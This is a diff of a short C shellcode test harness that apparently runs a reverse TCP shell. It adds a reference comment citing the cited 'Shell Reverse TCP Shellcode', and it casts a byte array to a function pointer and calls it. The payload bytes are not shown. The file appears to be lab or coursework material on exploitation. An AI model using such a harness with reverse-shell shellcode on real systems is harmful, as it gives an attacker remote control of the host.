@@ -1,3 +1,8 @@
+/*
+	References:
+	Ahrens, J.(2014), Shell Reverse TCP Shellcode - 74 bytes. Available from: https://shell-storm.org/shellcode/files/shellcode-883.html [Accessed 01/12/2022]
+*/
+
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -37,9 +42,9 @@ char shellcode[] = {
 int main()
 {
   	printf("Shellcode Main START\n");
-	//Injects shellcode into main
-  	int (*ret)() = (int(*)())shellcode;
-	ret();
+	//Returns shellcode instead of function
+  	int (*ret)() = (int(*)())shellcode; 		// - AJ
+	ret(); 										// - AJ
 
 	//Doesn't reach here
   	printf("Shellcode Main END\n");
